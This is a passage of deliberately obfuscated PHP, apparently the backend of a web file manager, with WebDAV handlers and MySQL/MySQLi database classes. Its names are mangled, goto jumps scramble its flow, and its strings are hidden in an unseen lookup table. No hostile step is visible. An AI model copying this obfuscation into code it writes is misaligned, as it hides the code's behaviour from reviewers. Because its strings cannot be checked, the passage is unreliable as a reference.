$Aµ´øë´Ë· = $c½ƒ¸Í‡ñã[8] . str_replace($c½ƒ¸Í‡ñã[172], $c½ƒ¸Í‡ñã[8], rawurlencode($Aµ´øë´Ë·)); goto B“º£İê«; b—¬âåĞµ: } public function parseItemXml($BˆÎ˜ÇÕµº, $DÌò÷³Œ„) { $A‚ôÙÛÆÓ =& $_SERVER[í…¶]; $E¼•¥´âÅ† = $this->parseItem($BˆÎ˜ÇÕµº, $DÌò÷³Œ„); if ($BˆÎ˜ÇÕµº[$A‚ôÙÛÆÓ[29]] == $A‚ôÙÛÆÓ[76]) { $aÆÍé÷—èĞ = $A‚ôÙÛÆÓ[1789]; $aÆÍé÷—èĞ .= $A‚ôÙÛÆÓ[1790]; } else { $e† Ù¥Îã‚ = $BˆÎ˜ÇÕµº[$A‚ôÙÛÆÓ[160]] ? $BˆÎ˜ÇÕµº[$A‚ôÙÛÆÓ[160]] : get_path_ext($BˆÎ˜ÇÕµº[$A‚ôÙÛÆÓ[28]]); $DÓ§İ´°Æ² = get_file_mime($e† Ù¥Îã‚); $aÆÍé÷—èĞ = $A‚ôÙÛÆÓ[1791]; $aÆÍé÷—èĞ .= "\74\104\72\x67\x65\164\x63\x6f\x6e\x74\x65\x6e\164\x74\171\x70\x65\x3e{$DÓ§İ´°Æ²}\x3c\57\104\x3a\147\x65\164\143\x6f\156\x74\x65\x6e\164\164\x79\160\145\76"; } return "\xa\11\11\74\x44\x3a\x72\x65\x73\160\x6f\156\163\x65\x3e\12\11\x9\x9\74\104\72\150\162\x65\146\x3e{$E¼•¥´âÅ†[$A‚ôÙÛÆÓ[1786]]}\74\x2f\104\x3a\150\162\145\x66\76\xa\x9\x9\11\74\x44\x3a\x70\162\157\x70\x73\x74\x61\164\76\xa\11\x9\11\11\74\x44\x3a\x70\x72\157\x70\76\12\11\x9\11\x9\x9\x3c\x44\72\147\145\164\x6c\141\163\x74\x6d\157\x64\151\146\x69\145\x64\x3e{$E¼•¥´âÅ†[$A‚ôÙÛÆÓ[107]]}\74\x2f\x44\x3a\147\x65\x74\x6c\141\163\164\x6d\x6f\x64\x69\x66\x69\145\x64\x3e\xa\11\11\11\11\x9\x3c\104\x3a\x63\x72\145\x61\164\x69\157\156\x64\141\164\145\x3e{$E¼•¥´âÅ†[$A‚ôÙÛÆÓ[187]]}\74\57\x44\72\x63\x72\145\141\164\151\x6f\156\x64\141\x74\x65\76\12\11\11\11\x9\11\74\x44\x3a\x67\145\x74\x63\x6f\156\164\x65\156\x74\154\x65\x6e\147\x74\150\76{$E¼•¥´âÅ†[$A‚ôÙÛÆÓ[77]]}\x3c\57\104\72\x67\145\164\143\x6f\156\164\145\x6e\x74\x6c\145\x6e\x67\164\150\76\xa\x9\11\11\11\x9{$aÆÍé÷—èĞ}\12\x9\11\x9\11\x3c\57\x44\x3a\x70\162\x6f\160\76\12\11\11\x9\11\x3c\104\72\x73\x74\x61\x74\x75\x73\76\110\124\124\120\57\x31\x2e\61\x20\x32\60\x30\x20\x4f\x4b\74\x2f\104\72\163\164\x61\164\x75\163\76\xa\11\x9\x9\x3c\x2f\x44\72\160\162\157\x70\x73\x74\x61\164\x3e\12\11\11\74\57\104\72\x72\145\x73\160\x6f\x6e\x73\145\x3e"; } public function pathListMerge($B–Œ†°áîš) { goto D›Îˆš»µ…; EÓ—ìÆÀğÁ: $Eæ‡¢øõƒ = array(); foreach ($B–Œ†°áîš as $A­Øéß´Œ => $dêÑ¾áõˆ¶) { if (!in_array($A­Øéß´Œ, $f‹ƒ½²’ñä) || !is_array($dêÑ¾áõˆ¶)) { continue; } $Eæ‡¢øõƒ = array_merge($Eæ‡¢øõƒ, $dêÑ¾áõˆ¶); } foreach ($Eæ‡¢øõƒ as &$Aè»ÌŒñáä) { $Aè»ÌŒñáä[$D¼¸¹í¶³[28]] = str_replace($D¼¸¹í¶³[8], $D¼¸¹í¶³[1386], $Aè»ÌŒñáä[$D¼¸¹í¶³[28]]); } goto dé«ÓğÏÈ; dé«ÓğÏÈ: return $Eæ‡¢øõƒ; goto e‡‘äÆªœŠ; D›Îˆš»µ…: $D¼¸¹í¶³ =& $_SERVER[í…¶]; if (!$B–Œ†°áîš) { return $B–Œ†°áîš; } $f‹ƒ½²’ñä = array($D¼¸¹í¶³[73], $D¼¸¹í¶³[74], $D¼¸¹í¶³[1792]); goto EÓ—ìÆÀğÁ; e‡‘äÆªœŠ: } public function httpPROPFIND() { goto c…›²±‹ˆ; A°‹ã‹Ö: if ($FŒŸ‡äØ¥) { $dÂÌ²Ú¡ğª = array($B·‡Úœ”˜); } else { $B·‡Úœ”˜[$DõÆîˆçø¸[28]] = $DõÆîˆçø¸[33]; $dÂÌ²Ú¡ğª = array_merge(array($B·‡Úœ”˜), $dÂÌ²Ú¡ğª); } $F’À¬á±ÑÃ = $DõÆîˆçø¸[33]; foreach ($dÂÌ²Ú¡ğª as $c‰¶¸ñ¼™) { $F’À¬á±ÑÃ .= $this->parseItemXml($c‰¶¸ñ¼™, $FŒŸ‡äØ¥); } goto fÎ¤ÔÇ‹·‰; c…›²±‹ˆ: $DõÆîˆçø¸ =& $_SERVER[í…¶]; $Fáè‘¸¼Ô = $this->pathList($this->path); $dÂÌ²Ú¡ğª = $this->pathListMerge($Fáè‘¸¼Ô); goto e„‡Ó¤ÂÎ; fÎ¤ÔÇ‹·‰: return array($DõÆîˆçø¸[1795] => 207, $DõÆîˆçø¸[1796] => "\x3c\104\72\x6d\x75\x6c\x74\151\163\x74\141\x74\165\x73\40\x78\x6d\x6c\156\163\x3a\104\x3d\42\104\x41\126\x3a\x22\76\xa{$F’À¬á±ÑÃ}\12\x3c\x2f\x44\x3a\x6d\165\x6c\x74\x69\x73\x74\141\164\165\163\76"); goto b§×’Ê¯É; e„‡Ó¤ÂÎ: $B·‡Úœ”˜ = $Fáè‘¸¼Ô[$DõÆîˆçø¸[1793]]; if (!is_array($dÂÌ²Ú¡ğª) || $B·‡Úœ”˜[$DõÆîˆçø¸[1794]] === !1) { return array($DõÆîˆçø¸[1795] => 404, $DõÆîˆçø¸[1796] => $DõÆîˆçø¸[1797]); } $FŒŸ‡äØ¥ = $B·‡Úœ”˜[$DõÆîˆçø¸[29]] == $DõÆîˆçø¸[167] || HttpHeader::get($DõÆîˆçø¸[1772]) == $DõÆîˆçø¸[477]; goto A°‹ã‹Ö; b§×’Ê¯É: } public function httpHEAD() { $f³ĞÂÊÎå¤ =& $_SERVER[í…¶]; $a‚ñ‚¼àÛ = $this->pathInfo($this->path); if (!$a‚ñ‚¼àÛ || $a‚ñ‚¼àÛ[$f³ĞÂÊÎå¤[29]] == $f³ĞÂÊÎå¤[76]) { return array($f³ĞÂÊÎå¤[1030] => 200, $f³ĞÂÊÎå¤[1205] => array($f³ĞÂÊÎå¤[1798])); } return array($f³ĞÂÊÎå¤[1030] => 200, $f³ĞÂÊÎå¤[1205] => array($f³ĞÂÊÎå¤[1799], $f³ĞÂÊÎå¤[136], $f³ĞÂÊÎå¤[1800] . $a‚ñ‚¼àÛ[$f³ĞÂÊÎå¤[77]], $f³ĞÂÊÎå¤[1801] . get_file_mime($a‚ñ‚¼àÛ[$f³ĞÂÊÎå¤[160]]), $f³ĞÂÊÎå¤[132] . gmdate($f³ĞÂÊÎå¤[1787], $a‚ñ‚¼àÛ[$f³ĞÂÊÎå¤[1252]]) . $f³ĞÂÊÎå¤[1802], $f³ĞÂÊÎå¤[1803])); } public function httpOPTIONS() { $d£…ƒ–¡Ôô =& $_SERVER[í…¶]; return array($d£…ƒ–¡Ôô[1030] => 200, $d£…ƒ–¡Ôô[1205] => array($d£…ƒ–¡Ôô[1804], $d£…ƒ–¡Ôô[1805], $d£…ƒ–¡Ôô[1806], $d£…ƒ–¡Ôô[1261])); } public function httpPROPPATCH() { $AÀ­–‘” =& $_SERVER[í…¶]; $C­¯ŸŸ¼ğÃ = $AÀ­–‘”[1807] . $_SERVER[$AÀ­–‘”[1384]] . $AÀ­–‘”[1808]; return array($AÀ­–‘”[1795] => 207, $AÀ­–‘”[1796] => "\x3c\104\72\x6d\x75\x6c\x74\x69\x73\x74\x61\164\165\x73\40\170\x6d\154\156\x73\x3a\x44\x3d\42\x44\x41\126\x3a\x22\x3e\xa{$C­¯ŸŸ¼ğÃ}\12\x3c\x2f\104\x3a\x6d\x75\154\x74\x69\163\164\x61\x74\165\x73\x3e"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $AµÉä¬çèĞ =& $_SERVER[í…¶]; $B…ÈÔ…öÕ¿ = $this->uploadFile(); if ($B…ÈÔ…öÕ¿) { $A±½¼Ùí‡ = 204; } else { $B…ÈÔ…öÕ¿ = $AµÉä¬çèĞ[33]; $A±½¼Ùí‡ = 201; } $CŠíËêšî = $this->pathPut($this->path, $B…ÈÔ…öÕ¿); if ($CŠíËêšî == !1) { $A±½¼Ùí‡ = 404; } return array($AµÉä¬çèĞ[1795] => $A±½¼Ùí‡); } private function uploadFile() { goto E‡’Ö‰…ÉÈ; E‹øˆÂ„Êõ: $A•Ÿå¢¼Ğ = @fopen($bŸµ”ÈÌöÏ, $F½²„‰Ì–Ò[1518]); $FÆ°îîë…Ú = @fopen($F½²„‰Ì–Ò[1810], $F½²„‰Ì–Ò[1517]); if (!$FÆ°îîë…Ú || !$A•Ÿå¢¼Ğ) { @unlink($bŸµ”ÈÌöÏ); return !1; } goto CâÎ²á×Ì; E‡’Ö‰…ÉÈ: $F½²„‰Ì–Ò =& $_SERVER[í…¶]; @mk_dir(TEMP_FILES); $bŸµ”ÈÌöÏ = TEMP_FILES . $F½²„‰Ì–Ò[1809] . rand_string(32); goto E‹øˆÂ„Êõ; CâÎ²á×Ì: while (!feof($FÆ°îîë…Ú)) { fwrite($A•Ÿå¢¼Ğ, fread($FÆ°îîë…Ú, 1024 * 200)); } fclose($FÆ°îîë…Ú); fclose($A•Ÿå¢¼Ğ); goto e•ïËµ«£‡; e•ïËµ«£‡: if (@filesize($bŸµ”ÈÌöÏ) > 0) { return $bŸµ”ÈÌöÏ; } @unlink($bŸµ”ÈÌöÏ); return !1; goto D„­´§½•™; D„­´§½•™: } public function httpMKCOL() { $D¾å«¤ô =& $_SERVER[í…¶]; if ($this->pathExists($this->path)) { return array($D¾å«¤ô[1030] => 409); } $E‹©éö‡® = $this->pathMkdir($this->path); return array($D¾å«¤ô[1030] => $E‹©éö‡® ? 201 : 403); } public function httpMOVE() { $BŒÛÚ¼É¶ =& $_SERVER[í…¶]; $BÉ÷«§®‡ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$BŒÛÚ¼É¶[1811]])) { $C¼­‚À¶Å·[$BŒÛÚ¼É¶[1812]] = $_SERVER[$BŒÛÚ¼É¶[1811]] == $BŒÛÚ¼É¶[1813]; } $dè“†‘½’Ã = $this->pathMove($this->path, $BÉ÷«§®‡); return array($BŒÛÚ¼É¶[1030] => $dè“†‘½’Ã ? 201 : 404); } public function httpCOPY() { $bî†É¸¼„­ = $this->parsePath($this->pathGet(!0)); $Fî®´÷‹ = $this->pathCopy($this->path, $bî†É¸¼„­); return array($_SERVER[í…¶][1030] => $Fî®´÷‹ ? 201 : 404); } public function httpDELETE() { $f¨äÊÊ·¬Æ = $this->pathRemove($this->path); return array($_SERVER[í…¶][1030] => $f¨äÊÊ·¬Æ ? 200 : 503); } public function httpLOCK() { $c¤ƒ†·ğ—Ä =& $_SERVER[í…¶]; $BØ‡Ÿ™¯Â = md5($this->path); $bÕ¿‡âÕ¨… = $c¤ƒ†·ğ—Ä[1814] . $this->xmlGet($c¤ƒ†·ğ—Ä[1815]) . $c¤ƒ†·ğ—Ä[1816] . $BØ‡Ÿ™¯Â . $c¤ƒ†·ğ—Ä[1817]; return array($c¤ƒ†·ğ—Ä[1030] => 200, $c¤ƒ†·ğ—Ä[1205] => array($c¤ƒ†·ğ—Ä[1818] . $BØ‡Ÿ™¯Â, $c¤ƒ†·ğ—Ä[1819]), $c¤ƒ†·ğ—Ä[1820] => $bÕ¿‡âÕ¨…); } public function httpUNLOCK() { return array($_SERVER[í…¶][1030] => 204); } public function xmlGet($F¯å‹®³Ÿé) { goto FÙ“·Ñ¢Ş±; FÙ“·Ñ¢Ş±: $Aí’±¥µ–Š =& $_SERVER[í…¶]; static $cëä†Ö‘¡ = false; if (!$cëä†Ö‘¡) { $b¦‚™”Ú½„ = file_get_contents($Aí’±¥µ–Š[1821]); $cëä†Ö‘¡ = new DOMDocument(); $cëä†Ö‘¡->loadXML($b¦‚™”Ú½„); } goto BºÍ¡ˆ¹éº; BºÍ¡ˆ¹éº: $cØëÜéèœÊ = array_shift(explode($Aí’±¥µ–Š[8], $F¯å‹®³Ÿé)); $c‹·­ÒÍÌ× = $cëä†Ö‘¡->getElementsByTagNameNS($Aí’±¥µ–Š[1822], $cØëÜéèœÊ); if ($c‹·­ÒÍÌ×) { return $c‹·­ÒÍÌ×[0]->nodeValue; } goto a¯‚¾îØÖø; a¯‚¾îØÖø: return $Aí’±¥µ–Š[33]; goto dÔ¸…™‰¤†; dÔ¸…™‰¤†: } public static function response($C­³ãÆ¦) { goto f‡¿´–›ê”; D¢ôéÍ¹‘: $eÖğ›É‹³ [] = $Aš¼–†³öÔ[1762]; $eÖğ›É‹³ [] = $Aš¼–†³öÔ[1763]; foreach ($eÖğ›É‹³  as $dêçİ–âÓ´) { header($dêçİ–âÓ´); } goto b¨©½; b¨©½: if (is_string($C­³ãÆ¦[$Aš¼–†³öÔ[1820]])) { header($Aš¼–†³öÔ[1823]); $f‘’ ôÅ² = $Aš¼–†³öÔ[1824] . $Aš¼–†³öÔ[217] . $C­³ãÆ¦[$Aš¼–†³öÔ[1820]]; echo $f‘’ ôÅ²; } goto bÈÍÜôó‹«; f‡¿´–›ê”: $Aš¼–†³öÔ =& $_SERVER[í…¶]; $eÖğ›É‹³  = is_array($C­³ãÆ¦[$Aš¼–†³öÔ[1205]]) ? $C­³ãÆ¦[$Aš¼–†³öÔ[1205]] : array(); $eÖğ›É‹³ [] = HttpHeader::code($C­³ãÆ¦[$Aš¼–†³öÔ[1030]]); goto D¢ôéÍ¹‘; bÈÍÜôó‹«: } } goto b¼¡Ìîâ²; cğäÕ†¯©: define($_SERVER[í…¶][1932], 5); define($_SERVER[í…¶][1933], 16); define($_SERVER[í…¶][1934], 32); goto C ŞÖÖ¿¯¨; BÒŒÖ’ÌÂ: class DbMysql extends Db { public function __construct($f««‚·áµ = '') { $F“¨èÊİƒŒ =& $_SERVER[í…¶]; if (!extension_loaded($F“¨èÊİƒŒ[730])) { think_exception(think_lang($F“¨èÊİƒŒ[10]) . $F“¨èÊİƒŒ[796]); } if (!empty($f««‚·áµ)) { $this->config = $f««‚·áµ; if (empty($this->config[$F“¨èÊİƒŒ[13]])) { $this->config[$F“¨èÊİƒŒ[13]] = $F“¨èÊİƒŒ[33]; } } } public function connect($E‚Äª¨ò¦ = '', $bù§æÇ˜Ó = 0, $a‘ª©‰ƒø« = false) { $FÑå¨¯±µ =& $_SERVER[í…¶]; if (!isset($this->linkID[$bù§æÇ˜Ó])) { goto f‘æ¹¦×í; B›Æ×àî…”: if (1 != think_config($FÑå¨¯±µ[18])) { unset($this->config); } goto dæ»Ú¤ÌÜÉ; f —Á©êàó: mysql_query($FÑå¨¯±µ[801] . think_config($FÑå¨¯±µ[802]) . $FÑå¨¯±µ[55], $this->linkID[$bù§æÇ˜Ó]); if ($F»ÉÙ¢Û†æ > $FÑå¨¯±µ[803]) { mysql_query($FÑå¨¯±µ[804], $this->linkID[$bù§æÇ˜Ó]); } $this->connected = !0; goto B›Æ×àî…”; f‘æ¹¦×í: if (empty($E‚Äª¨ò¦)) { $E‚Äª¨ò¦ = $this->config; } $bÃ¡š¨µÚ· = $E‚Äª¨ò¦[$FÑå¨¯±µ[797]] . ($E‚Äª¨ò¦[$FÑå¨¯±µ[798]] ? "\x3a{$E‚Äª¨ò¦[$FÑå¨¯±µ[798]]}" : $FÑå¨¯±µ[33]); $F¿ÓèÂ¢ğ = !empty($E‚Äª¨ò¦[$FÑå¨¯±µ[13]][$FÑå¨¯±µ[14]]) ? $E‚Äª¨ò¦[$FÑå¨¯±µ[13]][$FÑå¨¯±µ[14]] : $this->pconnect; goto bÓ©ñ§ÄñÀ; bÓ©ñ§ÄñÀ: if ($F¿ÓèÂ¢ğ) { $this->linkID[$bù§æÇ˜Ó] = mysql_pconnect($bÃ¡š¨µÚ·, $E‚Äª¨ò¦[$FÑå¨¯±µ[799]], $E‚Äª¨ò¦[$FÑå¨¯±µ[800]], 131072); } else { $this->linkID[$bù§æÇ˜Ó] = mysql_connect($bÃ¡š¨µÚ·, $E‚Äª¨ò¦[$FÑå¨¯±µ[799]], $E‚Äª¨ò¦[$FÑå¨¯±µ[800]], !0, 131072); } if (!$this->linkID[$bù§æÇ˜Ó] || !empty($E‚Äª¨ò¦[$FÑå¨¯±µ[17]]) && !mysql_select_db($E‚Äª¨ò¦[$FÑå¨¯±µ[17]], $this->linkID[$bù§æÇ˜Ó])) { think_exception(mysql_error()); } $F»ÉÙ¢Û†æ = mysql_get_server_info($this->linkID[$bù§æÇ˜Ó]); goto f —Á©êàó; dæ»Ú¤ÌÜÉ: } return $this->linkID[$bù§æÇ˜Ó]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($dÊ»¸íÍ™×) { goto F«×»ôÃœ; DÚŠËÙˆ£¨: think_action_status($eœˆ·Óáãª[19], 1); think_status($eœˆ·Óáãª[20]); $this->queryID = mysql_query($dÊ»¸íÍ™×, $this->_linkID); goto e•„ÚÛèœ–; e•„ÚÛèœ–: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto cÍª„—ª¿; B´Š°é¸¹²: if (!$this->_linkID) { return !1; } $this->queryStr = $dÊ»¸íÍ™×; if ($this->queryID) { $this->free(); } goto DÚŠËÙˆ£¨; F«×»ôÃœ: $eœˆ·Óáãª =& $_SERVER[í…¶]; if (0 === stripos($dÊ»¸íÍ™×, $eœˆ·Óáãª[252])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto B´Š°é¸¹²; cÍª„—ª¿: } public function execute($E“ã ÅİîÇ) { goto eøÙˆ í; e„±¿ˆè…À: $this->queryStr = $E“ã ÅİîÇ; if ($this->queryID) { $this->free(); } think_action_status($aÈ‹½™[21], 1); goto FŒÎ°·½ò–; FĞƒáùªÕ…: if (!1 === $DùËº¡‹·) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto E‚Ç†–÷é; FŒÎ°·½ò–: think_status($aÈ‹½™[20]); $DùËº¡‹· = mysql_query($E“ã ÅİîÇ, $this->_linkID); $this->debug(); goto FĞƒáùªÕ…; eøÙˆ í: $aÈ‹½™ =& $_SERVER[í…¶]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto e„±¿ˆè…À; E‚Ç†–÷é: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[í…¶][805], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $fÕÒÎíçÅ = mysql_query($_SERVER[í…¶][806], $this->_linkID); $this->transTimes = 0; if (!$fÕÒÎíçÅ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $CÜƒŠ–‘¦¦ = mysql_query($_SERVER[í…¶][807], $this->_linkID); $this->transTimes = 0; if (!$CÜƒŠ–‘¦¦) { $this->error(); return !1; } } return !0; } private function getAll() { $E—§Š‡¢ÙØ = array(); if ($this->numRows > 0) { while ($AŸë†›îÕ¢ = mysql_fetch_assoc($this->queryID)) { $E—§Š‡¢ÙØ[] = $AŸë†›îÕ¢; } mysql_data_seek($this->queryID, 0); } return $E—§Š‡¢ÙØ; } public function getFields($a ½¼ñè¡£) { $A½àÏÊç =& $_SERVER[í…¶]; $BªŒ´õ»¼ë = $this->query($A½àÏÊç[808] . $this->parseKey($a ½¼ñè¡£)); $e¦£ô÷ÕŞ = array(); if ($BªŒ´õ»¼ë) { foreach ($BªŒ´õ»¼ë as $f‘åá‚°ğê => $eä„™¬î¶Ò) { $e¦£ô÷ÕŞ[$eä„™¬î¶Ò[$A½àÏÊç[27]]] = array($A½àÏÊç[28] => $eä„™¬î¶Ò[$A½àÏÊç[27]], $A½àÏÊç[29] => $eä„™¬î¶Ò[$A½àÏÊç[30]], $A½àÏÊç[31] => (bool) (strtoupper($eä„™¬î¶Ò[$A½àÏÊç[32]]) === $A½àÏÊç[809]), $A½àÏÊç[34] => $eä„™¬î¶Ò[$A½àÏÊç[35]], $A½àÏÊç[36] => strtolower($eä„™¬î¶Ò[$A½àÏÊç[37]]) == $A½àÏÊç[38], $A½àÏÊç[39] => strtolower($eä„™¬î¶Ò[$A½àÏÊç[40]]) == $A½àÏÊç[41]); } } return $e¦£ô÷ÕŞ; } public function getTables($Fè•¹ïÇ¶ = '') { $d‡Óƒ¥ÒŠ =& $_SERVER[í…¶]; if (!empty($Fè•¹ïÇ¶)) { $fÑÒ¹Š²š³ = $d‡Óƒ¥ÒŠ[810] . $Fè•¹ïÇ¶; } else { $fÑÒ¹Š²š³ = $d‡Óƒ¥ÒŠ[811]; } $D‡çºŞ‹£ = $this->query($fÑÒ¹Š²š³); $CÆ‡ó—‚ÄÀ = array(); foreach ($D‡çºŞ‹£ as $b½î©²×Ô™ => $cÒ˜÷÷ÔŞÑ) { $CÆ‡ó—‚ÄÀ[$b½î©²×Ô™] = current($cÒ˜÷÷ÔŞÑ); } return $CÆ‡ó—‚ÄÀ; } public function replace($EÑŒ²÷†Ô…, $D»†ŠÛ”¦ò = array()) { $Aø™ª¯• =& $_SERVER[í…¶]; foreach ($EÑŒ²÷†Ô… as $BŠ›‚‡Ş‡ => $AÉáÃç£Øâ) { $cŠÓ²¤ © = $this->parseValue($AÉáÃç£Øâ); if (is_scalar($cŠÓ²¤ ©)) { $EË±Ç·”šç[] = $cŠÓ²¤ ©; $FÀ„Œ‰ğ‰Ú[] = $this->parseKey($BŠ›‚‡Ş‡); } } $cÃİ¡»ÅİÑ = $Aø™ª¯•[812] . $this->parseTable($D»†ŠÛ”¦ò[$Aø™ª¯•[267]]) . $Aø™ª¯•[813] . implode($Aø™ª¯•[47], $FÀ„Œ‰ğ‰Ú) . $Aø™ª¯•[814] . implode($Aø™ª¯•[47], $EË±Ç·”šç) . $Aø™ª¯•[815]; return $this->execute($cÃİ¡»ÅİÑ); } public function insertAll($EÉÙ‘¡²½Ì, $Dğñ‘éã‘ = array(), $Aí±ß‚Û› = false) { goto F·Á‘ºº¬ ; A¡…‚—®ìÅ: $EàÍö¦ÜÂ™ = ($Aí±ß‚Û› ? $fã‡·ÄÔ¸Â[817] : $fã‡·ÄÔ¸Â[818]) . $fã‡·ÄÔ¸Â[819] . $this->parseTable($Dğñ‘éã‘[$fã‡·ÄÔ¸Â[267]]) . $fã‡·ÄÔ¸Â[813] . implode($fã‡·ÄÔ¸Â[47], $fà¤ÛÍÂ‰Æ) . $fã‡·ÄÔ¸Â[820] . implode($fã‡·ÄÔ¸Â[47], $d’¼°˜àÓº); return $this->execute($EàÍö¦ÜÂ™); goto dÃøîê°ñ; F·Á‘ºº¬ : $fã‡·ÄÔ¸Â =& $_SERVER[í…¶]; if (!is_array($EÉÙ‘¡²½Ì[0])) { return !1; } $fà¤ÛÍÂ‰Æ = array_keys($EÉÙ‘¡²½Ì[0]); goto d¼ãÑ“Ëˆ•; d¼ãÑ“Ëˆ•: $d’¼°˜àÓº = array(); foreach ($EÉÙ‘¡²½Ì as $eö…Ëœá¥ø) { $E÷¤‡–êñ  = array(); foreach ($eö…Ëœá¥ø as $f—®ÉÃ½ƒ¨ => $CÙ°ÛÎ½‰) { $CÙ°ÛÎ½‰ = $this->parseValue($CÙ°ÛÎ½‰); if (is_scalar($CÙ°ÛÎ½‰)) { $E÷¤‡–êñ [] = $CÙ°ÛÎ½‰; } } $d’¼°˜àÓº[] = $fã‡·ÄÔ¸Â[248] . implode($fã‡·ÄÔ¸Â[47], $E÷¤‡–êñ ) . $fã‡·ÄÔ¸Â[815]; } array_walk($fà¤ÛÍÂ‰Æ, array($this, $fã‡·ÄÔ¸Â[816])); goto A¡…‚—®ìÅ; dÃøîê°ñ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $e¿Ö—«ø˜ =& $_SERVER[í…¶]; $this->error = mysql_errno() . $e¿Ö—«ø˜[4] . mysql_error($this->_linkID); if ($e¿Ö—«ø˜[33] != $this->queryStr) { $this->error .= LNG($e¿Ö—«ø˜[45]) . $this->queryStr; } think_trace($this->error, $e¿Ö—«ø˜[33], $e¿Ö—«ø˜[46]); return $this->error; } public function escapeString($cùÛ™Û˜â) { if ($this->_linkID) { return mysql_real_escape_string($cùÛ™Û˜â, $this->_linkID); } else { return mysql_escape_string($cùÛ™Û˜â); } } public function parseKey(&$cîáò‚Ç“Í, $Dó‰ÁÔ²–¬ = true) { $CÈÑÌÉò÷æ =& $_SERVER[í…¶]; if ($Dó‰ÁÔ²–¬) { $cîáò‚Ç“Í = $this->parseKeyCheck($cîáò‚Ç“Í); } if ($cîáò‚Ç“Í != $CÈÑÌÉò÷æ[176] && !preg_match($CÈÑÌÉò÷æ[821], $cîáò‚Ç“Í)) { $cîáò‚Ç“Í = $CÈÑÌÉò÷æ[822] . trim($cîáò‚Ç“Í, $CÈÑÌÉò÷æ[822]) . $CÈÑÌÉò÷æ[822]; } return $cîáò‚Ç“Í; } } class DbMysqli extends Db { public function __construct($eÛ’²¶íŒ‚ = '') { $aÒÔÎˆö£ =& $_SERVER[í…¶]; if (!extension_loaded($aÒÔÎˆö£[729])) { think_exception(think_lang($aÒÔÎˆö£[10]) . $aÒÔÎˆö£[823]); } if (!empty($eÛ’²¶íŒ‚)) { $this->config = $eÛ’²¶íŒ‚; if (empty($this->config[$aÒÔÎˆö£[13]])) { $this->config[$aÒÔÎˆö£[13]] = $aÒÔÎˆö£[33]; } } } public function connect($DåÉÛ¤ËÀ = '', $A¼ğÕö§— = 0) { $FöñÍ¢áƒÔ =& $_SERVER[í…¶]; if (!isset($this->linkID[$A¼ğÕö§—])) { goto B¤ïŸé«…•; D„…Ç»¬‡ª: $this->connected = !0; if (1 != think_config($FöñÍ¢áƒÔ[18])) { unset($this->config); } goto fÌ»¬óóß•; c×îƒøËŒ: $C‡¯Ì¤Õ‡ˆ = $this->linkID[$A¼ğÕö§—]->server_version; $this->linkID[$A¼ğÕö§—]->query($FöñÍ¢áƒÔ[801] . think_config($FöñÍ¢áƒÔ[802]) . $FöñÍ¢áƒÔ[55]); if ($C‡¯Ì¤Õ‡ˆ > $FöñÍ¢áƒÔ[803]) { $this->linkID[$A¼ğÕö§—]->query($FöñÍ¢áƒÔ[804]); } goto D„…Ç»¬‡ª; B¤ïŸé«…•: if (empty($DåÉÛ¤ËÀ)) { $DåÉÛ¤ËÀ = $this->config; } $this->linkID[$A¼ğÕö§—] = new mysqli($DåÉÛ¤ËÀ[$FöñÍ¢áƒÔ[797]], $DåÉÛ¤ËÀ[$FöñÍ¢áƒÔ[799]], $DåÉÛ¤ËÀ[$FöñÍ¢áƒÔ[800]], $DåÉÛ¤ËÀ[$FöñÍ¢áƒÔ[17]], $DåÉÛ¤ËÀ[$FöñÍ¢áƒÔ[798]] ? intval($DåÉÛ¤ËÀ[$FöñÍ¢áƒÔ[798]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto c×îƒøËŒ; fÌ»¬óóß•: } return $this->linkID[$A¼ğÕö§—]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($CÍáà‹ÙÑª) { goto D–ˆŒÆÓ³Ğ; C—§ñ‹Á‡‡: $this->queryStr = $CÍáà‹ÙÑª; if ($this->queryID) { $this->free(); } think_action_status($A‰Õ°‹ßŒ¦[19], 1); goto FØ»“…Œ—ã; FØ»“…Œ—ã: think_status($A‰Õ°‹ßŒ¦[20]); $this->queryID = $this->_linkID->query($CÍáà‹ÙÑª); if ($this->_linkID->more_results()) { while (($AğİÏÊ‹¸  = $this->_linkID->next_result()) != NULL) { $AğİÏÊ‹¸ ->free_result(); } } goto c…ÁÅß¡™Ã; c…ÁÅß¡™Ã: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto aøÅ”àŠã; D–ˆŒÆÓ³Ğ: $A‰Õ°‹ßŒ¦ =& $_SERVER[í…¶]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto C—§ñ‹Á‡‡; aøÅ”àŠã: } public function execute($eÒ–Šë´ğ) { goto e×•ÖÙ¯Ù¼; fÌéÍ“²›á: think_status($bÍÃ¥…ËÙÎ[20]); $eš„Ùêö©® = $this->_linkID->query($eÒ–Šë´ğ); $this->debug(); goto b§âó•‚¤½; e×•ÖÙ¯Ù¼: $bÍÃ¥…ËÙÎ =& $_SERVER[í…¶]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto a¨İÀÓµ; a¨İÀÓµ: $this->queryStr = $eÒ–Šë´ğ; if ($this->queryID) { $this->free(); } think_action_status($bÍÃ¥…ËÙÎ[21], 1); goto fÌéÍ“²›á; b§âó•‚¤½: if (!1 === $eš„Ùêö©®) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto døßñõ¦èØ; døßñõ¦èØ: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { 